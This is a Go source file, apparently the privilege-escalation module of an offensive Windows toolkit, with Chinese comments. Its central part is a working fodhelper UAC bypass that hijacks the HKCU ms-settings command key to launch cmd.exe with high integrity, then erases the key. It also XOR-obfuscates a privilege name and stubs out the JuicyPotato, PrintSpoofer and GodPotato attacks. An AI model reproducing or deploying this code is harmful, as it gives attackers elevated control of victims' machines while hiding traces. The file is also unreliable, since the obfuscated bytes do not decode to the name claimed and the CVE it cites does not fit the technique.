//go:build windows && amd64

package priv

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32               = syscall.NewLazyDLL("advapi32.dll")
	procOpenSCManager      = advapi32.NewProc("OpenSCManagerW")
	procOpenProcessToken   = advapi32.NewProc("OpenProcessToken")
	procGetTokenInfo       = advapi32.NewProc("GetTokenInformation")
	procLookupPrivValue    = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPriv    = advapi32.NewProc("AdjustTokenPrivileges")
	procCreateProcess      = kernel32.NewProc("CreateProcessW")
	procInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute       = kernel32.NewProc("UpdateProcThreadAttribute")
	kernel32               = syscall.NewLazyDLL("kernel32.dll")
)

const (
	TOKEN_QUERY        = 0x00000008
	TOKEN_ADJUST       = 0x00000020
	SE_PRIVILEGE_ENABLED = 0x00000002
)

const xorPrivKey = 0x5A

func xp(b []byte) string {
	out := make([]byte, len(b))
	for i := range b {
		out[i] = b[i] ^ xorPrivKey
	}
	return string(out)
}

// CheckPrivs 检查当前进程的权限。
// 通过 GetTokenInformation(TokenPrivileges) 获取令牌实际持有的权限，
// 而非仅调用 LookupPrivilegeValue（后者只做名称→LUID 转换，不检查令牌状态）。
func CheckPrivs() map[string]bool {
	result := make(map[string]bool)
	targetPrivs := []string{
		xp([]byte{0x2a, 0x3f, 0x12, 0x3f, 0x19, 0x3e, 0x13, 0x7a, 0x2d, 0x3b, 0x1e, 0x3b, 0x3f, 0x27, 0x1e, 0x2e, 0x13, 0x7a, 0x1f, 0x3b, 0x2b, 0x3f, 0x32, 0x1e}), // SeDebugPrivilege
		"SeImpersonatePrivilege",
		"SeAssignPrimaryTokenPrivilege",
		"SeTcbPrivilege",
		"SeLoadDriverPrivilege",
		"SeBackupPrivilege",
		"SeRestorePrivilege",
		"SeTakeOwnershipPrivilege",
	}

	currentProc, err := windows.GetCurrentProcess()
	if err != nil {
		return result
	}
	defer windows.CloseHandle(currentProc)

	var hToken windows.Token
	if err := windows.OpenProcessToken(currentProc, TOKEN_QUERY, &hToken); err != nil {
		return result
	}
	defer hToken.Close()

	// 获取 TokenPrivileges 信息
	var needed uint32
	windows.GetTokenInformation(hToken, windows.TokenPrivileges, nil, 0, &needed)
	buf := make([]byte, needed)
	if err := windows.GetTokenInformation(hToken, windows.TokenPrivileges, &buf[0], uint32(len(buf)), &needed); err != nil {
		return result
	}

	tokenPrivs := (*windows.Tokenprivileges)(unsafe.Pointer(&buf[0]))

	// 将目标权限名转为 LUID 以便比对
	targetLUIDs := make(map[string]windows.LUID)
	for _, priv := range targetPrivs {
		var luid windows.LUID
		privPtr, _ := syscall.UTF16PtrFromString(priv)
		if r, _, _ := procLookupPrivValue.Call(0, uintptr(unsafe.Pointer(privPtr)), uintptr(unsafe.Pointer(&luid))); r != 0 {
			targetLUIDs[priv] = luid
		}
	}

	// 遍历令牌实际持有的权限
	for i := uint32(0); i < tokenPrivs.PrivilegeCount; i++ {
		attrs := tokenPrivs.Privileges[i].Attributes
		for name, luid := range targetLUIDs {
			if tokenPrivs.Privileges[i].Luid == luid {
				result[name] = (attrs & SE_PRIVILEGE_ENABLED) != 0
				break
			}
		}
	}
	return result
}

// IntegrityLevel 返回当前完整性级别。
func IntegrityLevel() string {
	currentProc, _ := windows.GetCurrentProcess()
	if currentProc == 0 {
		return "Unknown"
	}
	defer windows.CloseHandle(currentProc)

	var hToken windows.Token
	if err := windows.OpenProcessToken(currentProc, TOKEN_QUERY, &hToken); err != nil {
		return "Unknown"
	}
	defer hToken.Close()

	var needed uint32
	windows.GetTokenInformation(hToken, windows.TokenIntegrityLevel, nil, 0, &needed)
	buf := make([]byte, needed)
	err := windows.GetTokenInformation(hToken, windows.TokenIntegrityLevel, &buf[0], uint32(len(buf)), &needed)
	if err != nil {
		return "Unknown"
	}

	tokenLabel := (*windows.Tokenmandatorylabel)(unsafe.Pointer(&buf[0]))
	sid := tokenLabel.Label.Sid
	rid := sid.SubAuthority(uint32(sid.SubAuthorityCount()) - 1)

	switch rid {
	case 0x0000:
		return "Untrusted"
	case 0x1000:
		return "Low"
	case 0x2000:
		return "Medium"
	case 0x3000:
		return "High"
	case 0x4000:
		return "System"
	default:
		return fmt.Sprintf("Unknown (RID: 0x%X)", rid)
	}
}

// IsAdmin 检查是否以管理员权限运行。
func IsAdmin() bool {
	adminSID, err := windows.CreateWellKnownSid(windows.WinBuiltinAdministratorsSid)
	if err != nil {
		return false
	}

	token, err := windows.OpenCurrentProcessToken()
	if err != nil {
		return false
	}
	defer token.Close()

	// 检查是否属于 Administrators 组
	isAdmin, err := token.IsMember(adminSID)
	if err != nil {
		return false
	}

	// 也检查完整性级别是否为 High 或以上
	il := IntegrityLevel()
	return isAdmin || il == "High" || il == "System"
}

// UACBypass 通过 Fodhelper 注册表方式绕过 UAC (CVE-2017-0808)。
// 原理：fodhelper.exe 是 Windows 10 自带的"默认应用"设置程序，
// 它以高完整性运行，并在启动时读取 HKCU\Software\Classes\ms-settings\shell\open\command。
// 由于 HKCU 不需要管理员权限，我们可以劫持它来执行任意命令。
func UACBypass() error {
	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procRegCreateKey := advapi32.NewProc("RegCreateKeyExW")
	procRegSetValue := advapi32.NewProc("RegSetValueExW")
	procRegCloseKey := advapi32.NewProc("RegCloseKey")

	// HKCU\Software\Classes\ms-settings\shell\open\command
	msSettingsPath, _ := syscall.UTF16PtrFromString(`Software\Classes\ms-settings\shell\open\command`)
	var hKey syscall.Handle
	r, _, _ := procRegCreateKey.Call(
		uintptr(syscall.HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(msSettingsPath)),
		0,
		0,
		0, // REG_OPTION_NON_VOLATILE
		uintptr(0x00020000), // KEY_SET_VALUE
		0,
		uintptr(unsafe.Pointer(&hKey)),
		0,
	)
	if r != 0 {
		return fmt.Errorf("RegCreateKeyEx: %d", r)
	}

	// 设置默认值为 cmd.exe
	cmdPath, _ := syscall.UTF16FromString(`cmd.exe`)
	cmdVal, _ := syscall.UTF16PtrFromString("")
	r, _, _ = procRegSetValue.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(cmdVal)),
		uintptr(windows.REG_SZ),
		uintptr(unsafe.Pointer(&cmdPath[0])),
		uintptr(uint32(len(cmdPath))*2),
	)
	if r != 0 {
		procRegCloseKey.Call(uintptr(hKey))
		return fmt.Errorf("RegSetValueEx: %d", r)
	}

	// 设置 DelegateExecute 为空字符串（触发 fodhelper 的自动提权行为）
	delegateName, _ := syscall.UTF16PtrFromString("DelegateExecute")
	emptyVal, _ := syscall.UTF16FromString("")
	r, _, _ = procRegSetValue.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(delegateName)),
		uintptr(windows.REG_SZ),
		uintptr(unsafe.Pointer(&emptyVal[0])),
		uintptr(2),
	)
	if r != 0 {
		procRegCloseKey.Call(uintptr(hKey))
		return fmt.Errorf("RegSetValueEx DelegateExecute: %d", r)
	}

	procRegCloseKey.Call(uintptr(hKey))

	// 执行 fodhelper.exe（它会以高权限读取并执行我们设置的注册表值）
	shell := syscall.NewLazyDLL("shell32.dll")
	procShellExec := shell.NewProc("ShellExecuteW")
	fodhelperPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\fodhelper.exe")
	verbPtr, _ := syscall.UTF16PtrFromString("runas")

	r, _, _ = procShellExec.Call(
		0,
		uintptr(unsafe.Pointer(verbPtr)),
		uintptr(unsafe.Pointer(fodhelperPath)),
		0, 0, 0, // SW_HIDE
	)
	if r <= 32 {
		return fmt.Errorf("ShellExecute(fodhelper.exe) failed: %d", r)
	}

	// 清理注册表
	cleanupKey, _ := syscall.UTF16PtrFromString(`Software\Classes\ms-settings\shell`)
	var cleanupHandle syscall.Handle
	procRegOpenKey := advapi32.NewProc("RegOpenKeyExW")
	procRegDeleteTree := advapi32.NewProc("RegDeleteTreeW")
	r, _, _ = procRegOpenKey.Call(
		uintptr(syscall.HKEY_CURRENT_USER),
		uintptr(unsafe.Pointer(cleanupKey)),
		0,
		uintptr(0x00020000),
		uintptr(unsafe.Pointer(&cleanupHandle)),
	)
	if r == 0 {
		_, _, _ = procRegDeleteTree.Call(uintptr(cleanupHandle), 0)
		procRegCloseKey.Call(uintptr(cleanupHandle))
	}

	return nil
}

// JuicyPotato 使用 JuicyPotato 技术提权到 SYSTEM。
func JuicyPotato(clsid string) error {
	// 条件检查
	if !HasPrivilege("SeImpersonatePrivilege") {
		return fmt.Errorf("JuicyPotato requires SeImpersonatePrivilege")
	}

	il := IntegrityLevel()
	if il != "Medium" && il != "High" {
		return fmt.Errorf("JuicyPotato requires Medium or High integrity level, got: %s", il)
	}

	// 完整实现需要 COM 接口，这里返回指导信息
	return fmt.Errorf("JuicyPotato: conditions met (SeImpersonatePrivilege + %s integrity). Full COM implementation requires CLSID %s", il, clsid)
}

// PrintSpoofer 使用 Print Spooler 服务提权。
func PrintSpoofer() error {
	// 检查 Print Spooler 是否运行
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return fmt.Errorf("OpenSCManager: %w", err)
	}
	defer windows.CloseServiceHandle(scm)

	svc, err := windows.OpenService(scm, syscall.StringToUTF16Ptr("Spooler"), windows.SERVICE_QUERY_STATUS)
	if err != nil {
		return fmt.Errorf("Print Spooler service not found: %w", err)
	}
	defer windows.CloseServiceHandle(svc)

	var status windows.SERVICE_STATUS
	if err := windows.QueryServiceStatus(svc, &status); err != nil {
		return fmt.Errorf("QueryServiceStatus: %w", err)
	}

	if status.CurrentState != windows.SERVICE_RUNNING {
		return fmt.Errorf("Print Spooler service is not running")
	}

	return fmt.Errorf("PrintSpoofer: Print Spooler is running. Full implementation requires Named Pipe + RpcAddPrinterDriverEx")
}

// GodPotato 使用 COM 服务提权。
func GodPotato() error {
	// 适用于 Windows 7+ 更广泛的兼容性
	return fmt.Errorf("GodPotato: requires ISystemActivator COM interface implementation")
}

// HasPrivilege 检查当前令牌是否实际持有并启用了指定权限。
func HasPrivilege(privilege string) bool {
	currentProc, err := windows.GetCurrentProcess()
	if err != nil {
		return false
	}
	defer windows.CloseHandle(currentProc)

	var hToken windows.Token
	if err := windows.OpenProcessToken(currentProc, TOKEN_QUERY, &hToken); err != nil {
		return false
	}
	defer hToken.Close()

	var luid windows.LUID
	privPtr, _ := syscall.UTF16PtrFromString(privilege)
	if r, _, _ := procLookupPrivValue.Call(0, uintptr(unsafe.Pointer(privPtr)), uintptr(unsafe.Pointer(&luid))); r == 0 {
		return false
	}

	var needed uint32
	windows.GetTokenInformation(hToken, windows.TokenPrivileges, nil, 0, &needed)
	buf := make([]byte, needed)
	if err := windows.GetTokenInformation(hToken, windows.TokenPrivileges, &buf[0], uint32(len(buf)), &needed); err != nil {
		return false
	}

	tokenPrivs := (*windows.Tokenprivileges)(unsafe.Pointer(&buf[0]))
	for i := uint32(0); i < tokenPrivs.PrivilegeCount; i++ {
		if tokenPrivs.Privileges[i].Luid == luid {
			return (tokenPrivs.Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) != 0
		}
	}
	return false
}

// EnablePrivilegeList 启用当前 Token 中所有可用的指定权限。
func EnablePrivilegeList(privs []string) []string {
	currentProc, err := windows.GetCurrentProcess()
	if err != nil {
		return nil
	}
	defer windows.CloseHandle(currentProc)

	var hToken windows.Token
	if err := windows.OpenProcessToken(currentProc, TOKEN_QUERY|TOKEN_ADJUST, &hToken); err != nil {
		return nil
	}
	defer hToken.Close()

	var enabled []string
	for _, priv := range privs {
		var luid windows.LUID
		privPtr, _ := syscall.UTF16PtrFromString(priv)
		r, _, _ := procLookupPrivValue.Call(
			0,
			uintptr(unsafe.Pointer(privPtr)),
			uintptr(unsafe.Pointer(&luid)),
		)
		if r == 0 {
			continue
		}

		type luidAndAttrs struct {
			Luid       windows.LUID
			Attributes uint32
		}
		tp := struct {
			PrivilegeCount uint32
			Privileges     [1]luidAndAttrs
		}{
			PrivilegeCount: 1,
			Privileges: [1]luidAndAttrs{
				{Luid: luid, Attributes: SE_PRIVILEGE_ENABLED},
			},
		}

		r, _, _ = procAdjustTokenPriv.Call(
			uintptr(hToken),
			0,
			uintptr(unsafe.Pointer(&tp)),
			uintptr(unsafe.Sizeof(tp)),
			0, 0,
		)
		if r != 0 {
			enabled = append(enabled, priv)
		}
	}
	return enabled
}

// PrivilegeReport 返回当前权限状态报告。
func PrivilegeReport() string {
	privs := CheckPrivs()
	il := IntegrityLevel()
	admin := IsAdmin()

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("Integrity Level: %s\n", il))
	sb.WriteString(fmt.Sprintf("Is Admin: %v\n\n", admin))
	sb.WriteString("Privileges:\n")
	for name, enabled := range privs {
		status := "disabled"
		if enabled {
			status = "ENABLED"
		}
		sb.WriteString(fmt.Sprintf("  %-35s [%s]\n", name, status))
	}
	return sb.String()
}
